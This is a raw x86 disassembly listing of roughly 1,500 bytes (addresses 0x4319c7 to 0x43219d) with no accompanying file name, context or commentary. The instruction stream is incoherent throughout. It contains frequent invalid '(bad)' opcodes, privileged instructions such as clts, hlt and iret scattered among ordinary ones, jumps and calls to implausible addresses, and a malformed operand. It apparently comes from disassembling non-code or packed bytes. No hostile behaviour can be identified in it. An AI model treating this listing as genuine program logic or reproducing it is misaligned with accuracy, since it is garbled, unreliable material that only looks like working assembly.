  4319c7:	add    eax,DWORD PTR [ebx]
  4319c9:	loopne 0x4319da
  4319cb:	dec    ebp
  4319cc:	ror    DWORD PTR [edx+0x7233084d],0x3
  4319d3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4319d9:	lock cdq 
  4319db:	ret    
  4319dc:	xor    al,BYTE PTR [ebp-0x77]
  4319df:	mov    esi,esp
  4319e1:	rol    BYTE PTR [ebp-0x7c],1
  4319e4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  4319ea:	call   edi
  4319ec:	enter  0x4d45,0x8b
  4319f0:	mov    esi,eax
  4319f2:	fmul   st(3),st
  4319f4:	push   ebp
  4319f5:	dec    ebp
  4319f6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4319fc:	ret    0xc199
  4319ff:	xor    al,BYTE PTR [esi-0x280276]
  431a05:	dec    ebp
  431a06:	jne    0x431a3b
  431a08:	mov    eax,DWORD PTR [ebx]
  431a0a:	cld    
  431a0b:	loopne 0x4319bd
  431a0d:	push   ebp
  431a0e:	add    DWORD PTR [eax+0x72851100],ecx
  431a14:	inc    DWORD PTR [eax]
  431a16:	inc    DWORD PTR [ebp-0x75]
  431a19:	mov    edi,esp
  431a1b:	lock add bl,0x1
  431a1f:	retf   
  431a20:	add    dh,al
  431a22:	xor    dh,cl
  431a24:	inc    ebp
  431a25:	scas   eax,DWORD PTR es:[edi]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	shl    al,0x0
  431a2b:	inc    ebp
  431a2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431a32:	call   0x462c6a
  431a37:	ud0    eax,ecx
  431a3a:	adc    al,0x4d
  431a3c:	inc    ebp
  431a3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431a43:	lock push 0x338055
  431a49:	add    eax,DWORD PTR [eax]
  431a4b:	ud0    ecx,edx
  431a4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431a51:	xor    ecx,ecx
  431a53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431a5a:	push   ecx
  431a5b:	add    BYTE PTR [ebp-0x38],cl
  431a5e:	mov    DWORD PTR [esi-0x740004],eax
  431a64:	cld    
  431a65:	inc    ebp
  431a66:	nop
  431a67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431a6d:	xabort 0xaf
  431a70:	icebp  
  431a71:	mov    esi,DWORD PTR [ebp-0x28]
  431a74:	(bad)  
  431a75:	retf   
  431a76:	or     ecx,eax
  431a78:	(bad)  
  431a79:	dec    ebp
  431a7a:	pop    es
  431a7b:	(bad)  
  431a7c:	(bad)  
  431a7d:	or     BYTE PTR [esi],al
  431a7f:	jb     0x431a47
  431a81:	add    BYTE PTR [ebx],al
  431a83:	inc    ebp
  431a84:	(bad)  
  431a85:	mov    ecx,DWORD PTR [edx]
  431a87:	fadd   st(6),st
  431a89:	ret    
  431a8a:	add    ah,BYTE PTR [edi-0x37]
  431a8d:	int    0x55
  431a8f:	sub    ebp,esp
  431a91:	add    edx,DWORD PTR [ecx-0x14]
  431a94:	inc    ebp
  431a95:	inc    ebp
  431a96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431a9c:	cld    
  431a9d:	(bad)  
  431a9e:	mov    WORD PTR [edi+0xf893be0],gs
  431aa4:	mov    ebp,ebp
  431aa6:	clc    
  431aa7:	push   eax
  431aa9:	push   DWORD PTR [ebp-0x4]
  431aac:	mov    BYTE PTR [ebp+0xa],0xff
  431ab0:	(bad)  
  431ab1:	int3   
  431ab2:	or     BYTE PTR [eax],al
  431ab4:	(bad)  
  431ab5:	lea    eax,[edi]
  431ab7:	ins    BYTE PTR es:[edi],dx
  431ab8:	(bad)  
  431ab9:	inc    DWORD PTR [ecx]
  431abb:	push   eax
  431abc:	mov    BYTE PTR [ebp+0x9],0x8b
  431ac0:	leave  
  431ac1:	les    edx,FWORD PTR [ebp+0x0]
  431ac4:	in     al,dx
  431ac5:	call   DWORD PTR [ecx-0x75]
  431ac8:	inc    ebp
  431ac9:	cld    
  431aca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431ad0:	cld    
  431ad1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431ad7:	std    
  431ad8:	mov    eax,DWORD PTR [eax]
  431ada:	clc    
  431adb:	test   eax,esi
  431add:	je     0x431b54
  431adf:	mov    eax,esi
  431ae1:	cld    
  431ae2:	add    al,0x80
  431ae4:	add    WORD PTR [ecx+0x0],ax
  431ae8:	fiadd  DWORD PTR [eax]
  431aea:	mov    BYTE PTR [eax],0xd6
  431aed:	push   0xffffffc3
  431aef:	push   edi
  431af0:	mov    edx,DWORD PTR [eax+0x51]
  431af3:	pop    edi
  431af4:	lea    ebx,[ebx-0x8]
  431af7:	ret    0x45
  431afa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431b00:	xchg   eax,edi
  431b02:	mov    DWORD PTR [ebp-0x75],ecx
  431b05:	push   esi
  431b06:	clc    
  431b07:	jne    0x431ad9
  431b09:	mov    ecx,0xf8450b0b
  431b0e:	(bad)  
  431b0f:	push   cs
  431b10:	or     BYTE PTR [ebp-0x3a],dh
  431b13:	cmp    eax,DWORD PTR [ecx]
  431b15:	pop    esi
  431b16:	(bad)  
  431b17:	or     al,0x5
  431b19:	inc    eax
  431b1a:	leave  
  431b1b:	jmp    0x40cf:0x21564204
  431b22:	leave  
  431b23:	jmp    0xdace5c27
  431b28:	mov    eax,DWORD PTR [edx-0x3a]
  431b2b:	jle    0x431b23
  431b2d:	inc    eax
  431b2e:	nop
  431b2f:	in     al,dx
  431b30:	inc    ebx
  431b32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431b38:	add    eax,0xff45e8f8
  431b3d:	push   esi
  431b3e:	push   DWORD PTR [ebp-0x39]
  431b41:	mov    eax,0x7e9da46
  431b46:	or     al,0x6
  431b48:	push   DWORD PTR [ebp-0x3a]
  431b4b:	cmp    eax,DWORD PTR [edx]
  431b4d:	pop    esi
  431b4e:	ret    
  431b4f:	or     al,0x56
  431b51:	inc    ecx
  431b52:	push   ebp
  431b53:	jle    0x431b41
  431b55:	inc    edx
  431b56:	inc    ebp
  431b57:	leave  
  431b58:	add    DWORD PTR [ecx+0x28],eax
  431b5b:	and    esp,edi
  431b5d:	inc    ecx
  431b5e:	jne    0x431b47
  431b60:	add    DWORD PTR [edx+0x1c],eax
  431b63:	retf   0xc38b
  431b66:	adc    al,0x8b
  431b68:	xchg   edx,eax
  431b69:	push   ecx
  431b6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431b70:	rcl    DWORD PTR [esi-0x9],cl
  431b73:	jne    0x431bc5
  431b75:	mov    eax,0x7c80ece
  431b7a:	rol    DWORD PTR [esi],cl
  431b7c:	div    DWORD PTR [ebp+0x50]
  431b7f:	cmp    ecx,edx
  431b81:	pop    esi
  431b82:	dec    BYTE PTR [edx]
  431b84:	in     al,dx
  431b85:	inc    edx
  431b86:	sub    ebp,ebp
  431b88:	inc    eax
  431b89:	(bad)  
  431b8a:	push   eax
  431b8b:	add    edx,DWORD PTR [eax-0x13]
  431b8e:	push   edi
  431b8f:	add    dh,dh
  431b91:	leave  
  431b92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431b96:	add    BYTE PTR [ecx+0x0],dl
  431b99:	inc    ebp
  431b9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ba0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ba6:	add    al,0x2
  431ba8:	jmp    0x57ec702
  431bad:	jne    0x431b97
  431baf:	mov    eax,DWORD PTR [edx]
  431bb1:	or     BYTE PTR [eax],al
  431bb3:	inc    ecx
  431bb4:	stc    
  431bb5:	jmp    0xe7825bf0
  431bba:	jge    0x431bfd
  431bbc:	mov    esi,ebp
  431bbe:	lock ret 0x7d
  431bc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431bc8:	add    bh,bh
  431bca:	aad    0xd7
  431bcc:	add    dh,cl
  431bce:	clts   
  431bd0:	(bad)  
  431bd1:	call   0xffce1ad6
  431bd6:	hlt    
  431bd7:	iret   
  431bd8:	jge    0x431bb0
  431bda:	rol    DWORD PTR [esi-0x80],cl
  431bdd:	cmc    
  431bde:	or     BYTE PTR [edi-0x27],cl
  431be1:	(bad)  
  431be2:	out    dx,al
  431be3:	mov    eax,DWORD PTR [ebx]
  431be5:	(bad)  
  431be6:	pop    esi
  431be7:	push   es
  431be8:	cmp    al,0xe8
  431bea:	sar    edi,0x8
  431bed:	inc    DWORD PTR [edi]
  431bef:	inc    esi
  431bf0:	(bad)  
  431bf1:	in     al,dx
  431bf2:	jle    0x431c4b
  431bf4:	push   cs
  431bf5:	push   ebx
  431bf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431bfc:	add    BYTE PTR [ebp+0x50],al
  431bff:	push   eax
  431c00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431c06:	sub    edx,DWORD PTR [esi-0x24]
  431c09:	jne    0x431bc1
  431c0b:	lods   eax,DWORD PTR ds:[esi]
  431c0c:	mov    edx,DWORD PTR [edx-0x34]
  431c0f:	dec    esi
  431c10:	out    0x83,eax
  431c12:	into   
  431c13:	push   edi
  431c15:	loopne 0x431be5
  431c17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431c1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431c22:	rol    DWORD PTR [edx],0x8
  431c25:	mov    esp,ecx
  431c27:	cmp    DWORD PTR [ebx],0xc
  431c2a:	mov    esi,0x5001c0
  431c2f:	push   eax
  431c30:	push   cs
  431c31:	push   eax
  431c32:	(bad)  
  431c33:	sub    edx,edi
  431c35:	push   esi
  431c36:	adc    al,0xcb
  431c38:	ins    DWORD PTR es:[edi],dx
  431c39:	mov    eax,0x203e8
  431c3e:	add    al,ah
  431c40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431c47:	add    dh,al
  431c49:	add    ah,ch
  431c4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431c51:	pop    ecx
  431c52:	or     eax,ebx
  431c54:	cli    
  431c55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431c5b:	lea    ebp,[ebx]
  431c5d:	mov    edx,DWORD PTR [edx-0x4]
  431c60:	dec    ecx
  431c61:	inc    ebp
  431c62:	shr    BYTE PTR [ebx],0x4b
  431c65:	and    al,0x0
  431c67:	(bad)  
  431c68:	jne    0x431caf
  431c6a:	pop    eax
  431c6b:	mov    al,0x5a
  431c6d:	call   0x1421ecc
  431c72:	and    al,0x85
  431c74:	push   edx
  431c75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431c79:	dec    ebp
  431c7a:	mov    cl,0x23
  431c7c:	jmp    0x431c6a
  431c7e:	mov    al,0xe7
  431c80:	call   0x1391f6e
  431c85:	shr    DWORD PTR [eax+ebx*2],cl
  431c88:	lock (bad) 
  431c8a:	adc    eax,0x757f008d
  431c8f:	out    0x58,eax
  431c91:	cmp    al,0x7
  431c93:	pop    edx
  431c94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431c9b:	push   ecx
  431c9c:	cld    
  431c9d:	mov    esi,0x3b0175
  431ca2:	and    al,0xb0
  431ca4:	xor    BYTE PTR [edx+0x1],0x8b
  431ca8:	add    ah,bh
  431caa:	mov    edi,DWORD PTR [ebp-0x4]
  431cad:	psubsw mm7,QWORD PTR [edi]
  431cb0:	add    DWORD PTR [ebp+0x0],ebp
  431cb3:	rcr    eax,1
  431cb5:	mov    edi,ecx
  431cb7:	and    eax,DWORD PTR [eax]
  431cb9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431cbf:	call   0x1301fa8
  431cc4:	add    al,cl
  431cc6:	mov    ebp,esi
  431cc8:	aam    0x83
  431cca:	or     DWORD PTR [ecx],eax
  431ccc:	jne    0x431cbf
  431cce:	mov    eax,DWORD PTR [eax]
  431cd0:	aam    0x0
  431cd2:	dec    ebp
  431cd3:	jne    0x431c60
  431cd5:	cmp    ebx,eax
  431cd7:	jb     0x431d26
  431cd9:	jmp    0x431c66
  431cdb:	mov    ebx,esp
  431cdd:	int3   
  431cde:	dec    ebp
  431cdf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431ce6:	mov    edx,0x8b0a8b
  431ceb:	cmp    ecx,DWORD PTR [eax]
  431ced:	jb     0x431cc6
  431cef:	pop    edx
  431cf0:	push   edi
  431cf1:	cli    
  431cf2:	pop    es
  431cf3:	mov    eax,ecx
  431cf5:	jb     0x431cf9
  431cf7:	add    DWORD PTR [ebx],0xa
  431cfa:	mov    eax,DWORD PTR [ebx]
  431cfc:	int3   
  431cfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431d03:	jmp    0x431c90
  431d05:	mov    al,0xe8
  431d07:	call   0x1041f89
  431d0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431d0f:	pop    edi
  431d10:	or     BYTE PTR [ecx-0x73],bl
  431d13:	pop    ecx
  431d14:	inc    edi
  431d15:	xor    al,0xeb
  431d17:	push   ecx
  431d18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431d1e:	call   0xb21e23
  431d23:	int3   
  431d24:	sbb    BYTE PTR [esi],ch
  431d26:	inc    ebp
  431d27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431d2d:	call   0x9c1f9c
  431d32:	or     BYTE PTR [ebx-0x73],dl
  431d35:	cmp    al,0x47
  431d37:	mov    al,0x1
  431d39:	jb     0x431d3b
  431d3b:	mov    al,0x10
  431d3d:	push   eax
  431d3e:	add    al,0x75
  431d40:	add    BYTE PTR [ebx],ch
  431d42:	add    ebx,esp
  431d44:	int3   
  431d45:	jne    0x431d57
  431d47:	movsx  edx,cl
  431d4a:	add    DWORD PTR [eax],eax
  431d4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431d53:	mov    gs,edi
  431d55:	add    BYTE PTR [eax-0x50],ch
  431d58:	add    al,ch
  431d5a:	mov    eax,DWORD PTR [ecx]
  431d5c:	sub    eax,DWORD PTR [eax]
  431d5e:	jb     0x431dd5
  431d60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431d64:	jge    0x431d4e
  431d66:	add    al,0x1
  431d68:	add    DWORD PTR [eax],0x0
  431d6b:	jne    0x431d6d
  431d6d:	je     0x431db4
  431d6f:	mov    eax,DWORD PTR [edi]
  431d71:	ror    BYTE PTR [ebp+0x4d],1
  431d74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431d7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431d81:	mov    DWORD PTR [ebx],ebp
  431d83:	fadd   DWORD PTR [eax+0x75]
  431d86:	inc    eax
  431d87:	pop    eax
  431d88:	lea    ebx,[ecx+0x4f]
  431d8b:	push   0xb1000003
  431d90:	out    dx,eax
  431d91:	add    ebp,DWORD PTR [edx+edx*2]
  431d94:	add    BYTE PTR [ebx+ecx*4],bh
  431d97:	mov    ch,BYTE PTR [ebx]
  431d99:	jb     0x431e0d
  431d9b:	add    al,0x89
  431d9d:	push   eax
  431d9e:	call   0x842b6b10
  431da3:	add    DWORD PTR [eax+eax*1],eax
  431da6:	jae    0x431dbc
  431da8:	icebp  
  431da9:	inc    ebp
  431daa:	mov    eax,DWORD PTR gs:[ecx]
  431dad:	int3   
  431dae:	out    dx,al
  431daf:	loopne 0x431dfe
  431db1:	sub    eax,DWORD PTR [edx]
  431db3:	push   0xffffff83
  431db5:	pop    esi
  431db6:	push   cs
  431db7:	jl     0x431dd2
  431db9:	add    al,0xaf
  431dbb:	xor    eax,0x832b6d00
  431dc0:	mov    eax,DWORD PTR [edx]
  431dc2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431dc8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431dce:	inc    ebp
  431dcf:	shr    ebx,0x3
  431dd2:	or     DWORD PTR [eax],0x4
  431dd5:	push   0xffffffa5
  431dd7:	pop    esi
  431dd8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431ddf:	jmp    0x431e3e
  431de1:	mov    edi,0xff0272
  431de6:	fdivr  QWORD PTR [ebp+0x5d]
  431de9:	push   0x4e
  431deb:	pop    ecx
  431dec:	call   0x4361f1
  431df1:	mov    DWORD PTR [ebx],eax
  431df3:	in     al,0xc8
  431df5:	rol    BYTE PTR [ebp-0x75],0xc1
  431df9:	call   0xad1fda
  431dfe:	pop    esi
  431dff:	enter  0xceff,0x8b
  431e03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431e07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431e0e:	je     0x431e10
  431e10:	or     DWORD PTR [ebx-0x74183b24],eax
  431e16:	jne    0x431dfc
  431e18:	jmp    0x431e13
  431e1a:	push   DWORD PTR [edx-0x24]
  431e1d:	push   0x4d
  431e1f:	pop    ecx
  431e20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431e24:	jge    0x431e2c
  431e26:	mov    eax,eax
  431e28:	sub    ebp,DWORD PTR [edx+0x24]
  431e2b:	pop    esi
  431e2c:	inc    ebp
  431e2d:	mov    esp,0x8b6077
  431e32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431e38:	lods   al,BYTE PTR ds:[esi]
  431e39:	add    BYTE PTR [ebx],bh
  431e3b:	enter  0xce73,0x49
  431e3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431e47:	stc    
  431e48:	jge    0x431ebc
  431e4a:	jnp    0xdd42a1b9
  431e50:	call   0xc61f26
  431e55:	fadd   st(0),st
  431e57:	dec    esi
  431e58:	ins    BYTE PTR es:[edi],dx
  431e59:	stc    
  431e5a:	cmp    al,0x73
  431e5c:	push   ebp
  431e5d:	mov    eax,0xf8028b
  431e62:	jne    0x431e25
  431e64:	mov    esi,ecx
  431e66:	mov    esp,DWORD PTR [ebp+0x2c]
  431e69:	add    edi,DWORD PTR [ebp-0x24]
  431e6c:	sub    esp,eax
  431e6e:	and    al,0x45
  431e70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431e76:	sbb    al,0xee
  431e78:	pop    esi
  431e79:	call   0x831ea9
  431e7e:	fsubr  st,st(3)
  431e80:	sti    
  431e81:	add    BYTE PTR gs:[ecx],bh
  431e84:	add    eax,esp
  431e86:	add    DWORD PTR [esi],eax
  431e88:	rol    DWORD PTR [ebp+0x8],0x29
  431e8c:	mov    esp,eax
  431e8e:	clc    
  431e8f:	jne    0x431f06
  431e91:	mov    eax,0x8b0673
  431e96:	loopne 0x431edd
  431e98:	loopne 0x431e23
  431e9a:	lods   al,BYTE PTR ds:[esi]
  431e9b:	int3   
  431e9c:	inc    ebp
  431e9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431ea1:	add    al,0xc3
  431ea3:	sub    ecx,DWORD PTR [ebp+0x47]
  431ea6:	(bad)  
  431ea8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431eac:	add    eax,DWORD PTR [eax]
  431eae:	call   0x644dfb3
  431eb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431eb9:	dec    esi
  431eba:	ins    DWORD PTR es:[edi],dx
  431ebb:	in     al,dx
  431ebc:	lea    eax,[eax]
  431ebe:	inc    ebp
  431ebf:	inc    ebp
  431ec0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431ec6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431ed0:	and    al,0xdc
  431ed2:	ror    DWORD PTR [edx+0x24],0xf7
  431ed6:	or     BYTE PTR [ebp+0x4c],dh
  431ed9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431edd:	stos   BYTE PTR es:[edi],al
  431ede:	adc    edx,edi
  431ee0:	inc    esp
  431ee1:	add    edi,DWORD PTR [eax]
  431ee3:	jne    0x431ec8
  431ee5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431eeb:	cmp    ecx,DWORD PTR [edi]
  431eed:	sub    BYTE PTR [ebp-0x7e],dl
  431ef0:	sar    ebp,0xb
  431ef3:	jmp    FWORD PTR [edi+0x2400392a]
  431ef9:	sub    esi,DWORD PTR [ebx-0x73]
  431efc:	mov    esp,DWORD PTR [ecx+edi*4]
  431eff:	mov    ecx,DWORD PTR [eax]
  431f01:	and    BYTE PTR [eax],al
  431f03:	jne    0x431ecf
  431f05:	sub    ebp,ecx
  431f07:	sbb    BYTE PTR [esi+0x32],ah
  431f0a:	dec    ebp
  431f0b:	push   ebp
  431f0c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431f12:	ret    
  431f13:	mov    edx,ebp
  431f15:	leave  
  431f16:	sub    DWORD PTR [esi+0x24],ebx
  431f19:	ret    0x2b
  431f1c:	pop    ax
  431f1e:	push   ebp
  431f1f:	rol    BYTE PTR [ebx],0xeb
  431f22:	add    DWORD PTR [ecx+0x6c0001],0x40
  431f29:	jb     0x431f80
  431f2b:	ret    
  431f2c:	in     al,dx
  431f2d:	jecxz  0x431eba
  431f2f:	push   esi
  431f30:	xchg   esp,eax
  431f31:	jne    0x431f33
  431f33:	cmp    edx,DWORD PTR [esi+0x1c]
  431f36:	jne    0x431f1c
  431f38:	mov    eax,DWORD PTR [ebp-0x77]
  431f3b:	ror    DWORD PTR [ebx+0x899408],0xe0
  431f42:	mov    esi,DWORD PTR [ebp-0x75]
  431f45:	pop    esi
  431f46:	nop
  431f47:	mov    eax,DWORD PTR [eax]
  431f49:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431f4f:	add    al,0x0
  431f51:	inc    ebp
  431f52:	mov    eax,DWORD PTR [ebx]
  431f54:	mov    ebp,ebx
  431f56:	cmp    al,0xf
  431f58:	or     al,al
  431f5a:	inc    ebp
  431f5b:	inc    ebp
  431f5c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  431f64:	mov    bh,0xc0
  431f66:	push   ss
  431f67:	ins    BYTE PTR es:[edi],dx
  431f68:	push   ecx
  431f69:	add    BYTE PTR [ecx-0x5],dl
  431f6c:	add    eax,0x17200
  431f71:	sbb    al,0x85
  431f73:	dec    esp
  431f74:	je     0x431fae
  431f76:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431f7a:	add    BYTE PTR [ebx],bh
  431f7c:	(bad)  
  431f7d:	and    al,0x39
  431f7f:	jae    0x431f1d
  431f81:	mov    cl,cl
  431f83:	inc    DWORD PTR [esp]
  431f86:	push   ebp
  431f87:	shr    esp,0x8
  431f8a:	in     al,dx
  431f8b:	push   esp
  431f8c:	add    DWORD PTR [eax],esp
  431f8e:	add    bl,cl
  431f90:	inc    ebp
  431f91:	mov    bh,0x89
  431f93:	add    ah,bh
  431f95:	jmp    0xca7c2edf
  431f9a:	pushf  
  431f9b:	dec    esp
  431f9c:	mov    edx,0xf8178520
  431fa1:	fst    DWORD PTR [ebp+0x0]
  431fa4:	mov    BYTE PTR [eax],0xc4
  431fa7:	sub    edx,DWORD PTR [ebx-0x3f]
  431faa:	inc    ebp
  431fab:	add    eax,0xc601da
  431fb0:	mov    al,0xc6
  431fb3:	ins    BYTE PTR es:[edi],dx
  431fb4:	mov    DWORD PTR [eax+0x57],0x280545c1
  431fbb:	dec    esp
  431fbc:	jmp    DWORD PTR [eax]
  431fbe:	inc    ebp
  431fbf:	fnstcw WORD PTR [esi+0x29]
  431fc2:	test   BYTE PTR [eax],0xc6
  431fc5:	rol    BYTE PTR [eax],0xc0
  431fc8:	lea    ecx,[ebp-0x3cf0dbcb]
  431fce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431fd4:	inc    esi
  431fd5:	add    DWORD PTR [eax],ebx
  431fd7:	add    dh,bh
  431fd9:	mov    esi,DWORD PTR [edx+0x8]
  431fdc:	(bad)  
  431fdd:	fdiv   QWORD PTR ss:[ecx]
  431fe0:	(bad)  
  431fe1:	mov    bl,ch
  431fe3:	add    esi,eax
  431fe5:	add    dh,bl
  431fe7:	or     esi,eax
  431fe9:	mov    dl,0xdf
  431feb:	add    esi,eax
  431fed:	add    al,ah
  431fef:	push   cs
  431ff0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431ff7:	or     BYTE PTR [ebx],dh
  431ff9:	dec    ecx
  431ffa:	lea    eax,[ebx]
  431ffc:	xor    eax,0x18fc0fc7
  432001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432002:	repz clc 
  432004:	add    eax,DWORD PTR [ebp+0x46]
  432007:	prefetcht0 BYTE PTR [ecx-0x2]
  43200b:	xor    eax,0x7c60872
  432010:	mov    esp,0xbd32c699
  432015:	pop    esi
  432016:	mov    cl,0xbe
  432019:	or     al,0xc6
  43201b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432022:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432029:	add    dh,al
  43202b:	mov    eax,ebx
  43202d:	xor    DWORD PTR [ebx],0x35008dbc
  432033:	mov    ecx,DWORD PTR [edi]
  432035:	sbb    al,0x18
  432037:	inc    ebp
  432038:	xrelease mov DWORD PTR [ebx],0x188546f4
  43203f:	clc    
  432040:	(bad)  
  432041:	ss jb  0x431fe0
  432044:	lea    ecx,[ecx+0x45ffe838]
  43204a:	mov    ebp,esp
  43204c:	fadd   st,st(6)
  43204e:	dec    ebp
  43204f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432055:	out    0x1,eax
  432057:	inc    ebp
  432058:	lea    ebp,[ecx]
  43205a:	inc    esi
  43205c:	dec    eax
  43205e:	enter  0xa33,0xc6
  432062:	push   ebp
  432063:	leave  
  432064:	(bad)  
  432065:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43206b:	add    BYTE PTR [ebp+0x44],al
  43206e:	mov    eax,esp
  432070:	mov    WORD PTR [esi+0x44398300],?
  432076:	psubusw mm4,QWORD PTR [eax-0x78]
  43207a:	add    BYTE PTR [ebx-0x1303f975],al
  432080:	add    BYTE PTR [ebp+0x1],0xeb
  432084:	add    BYTE PTR [ebp+0x38],al
  432087:	jmp    0xdbce65d1
  43208c:	add    BYTE PTR [ebp+0x0],0xe8
  432090:	mov    DWORD PTR [ebp-0x48],eax
  432093:	sub    DWORD PTR [edi+0x45],ecx
  432096:	add    BYTE PTR [eax],ch
  432098:	js     0x4320df
  43209a:	data16 jle 0x432022
  43209d:	idiv   bh
  43209f:	inc    esp
  4320a0:	(bad)  
  4320a1:	fadd   st(7),st
  4320a3:	mov    dh,0x89
  4320a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4320a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4320af:	pop    es
  4320b0:	push   0x8d45ffec
  4320b5:	jmp    0xe6cc65bd
  4320ba:	push   0x45
  4320bc:	jmp    edx
  4320be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4320c2:	mov    DWORD PTR [ebp+0x6c],eax
  4320c5:	(bad)  
  4320c7:	inc    ebp
  4320c8:	(bad)  
  4320c9:	out    dx,al
  4320ca:	add    al,0x45
  4320cc:	mov    edi,esp
  4320ce:	outs   dx,BYTE PTR ds:[esi]
  4320cf:	inc    ebp
  4320d0:	(bad)  
  4320d1:	jle    0x432056
  4320d3:	idiv   BYTE PTR ds:0x70bc8944
  4320d9:	mov    dh,0xff
  4320db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4320e2:	jb     0x432067
  4320e4:	dec    DWORD PTR [eax]
  4320e6:	mov    ebp,esp
  4320e8:	test   WORD PTR [ebp-0x1],ax
  4320ef:	inc    ebp
  4320f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4320f7:	adc    edi,edi
  4320f9:	mov    ebp,edi
  4320fb:	mov    eax,DWORD PTR [eax]
  4320fd:	cmp    BYTE PTR [esi-0x1],ah
  432100:	test   DWORD PTR [ebx],edi
  432102:	push   DWORD PTR [ebp-0x1]
  432105:	mov    DWORD PTR [esi-0x48],ebp
  432108:	add    BYTE PTR [ebp+0x66],al
  43210b:	jmp    0x432092
  43210d:	pushf  
  43210e:	dec    DWORD PTR [ebx-0x7f940301]
  432114:	add    BYTE PTR [ecx],al
  432116:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43211d:	add    al,al
  43211f:	add    BYTE PTR [esi+0x45],ah
  432122:	test   DWORD PTR [ebx+0xff7cff],ecx
  432128:	inc    eax
  432129:	mov    DWORD PTR [eax],eax
  43212b:	mov    esp,DWORD PTR [esi-0x4]
  43212e:	inc    ebp
  43212f:	cmp    BYTE PTR [eax+0x4701],0x38
  432136:	mov    DWORD PTR [ebp-0x7e],ebp
  432139:	add    BYTE PTR [edi-0x73],al
  43213c:	push   0xffffffcd
  43213e:	mov    WORD PTR [ebp+0x64],ax
  432142:	(bad)  
  432143:	call   eax
  432145:	mov    esp,esi
  432147:	data16 cmc 
  432149:	test   DWORD PTR [ebp-0x1],eax
  43214c:	(bad)  
  43214e:	out    0xc0,eax
  432150:	lea    esp,[esi-0x30]
  432153:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432159:	inc    edi
  43215a:	jmp    0x75ff:0x40858866
  432161:	dec    DWORD PTR [ebp-0x7a992f40]
  432167:	test   esi,edi
  432169:	(bad)  
  43216a:	(bad)  
  43216b:	inc    DWORD PTR [ebp-0x9901b9]
  432171:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432177:	rcl    BYTE PTR [ecx+0x66],0x33
  43217b:	test   DWORD PTR [ebx+0xff72ff],edi
  432181:	inc    edi
  432182:	ret    
  432183:	mov    ax,WORD PTR [ebp-0x3f0004]
  43218a:	push   eax
  43218b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432192:	add    BYTE PTR [ebx-0x764f0839],al
  432198:	push   DWORD PTR [esi+0x1]
  43219b:	inc    DWORD PTR [eax]
  43219d:	mov    eax,0xff99ff
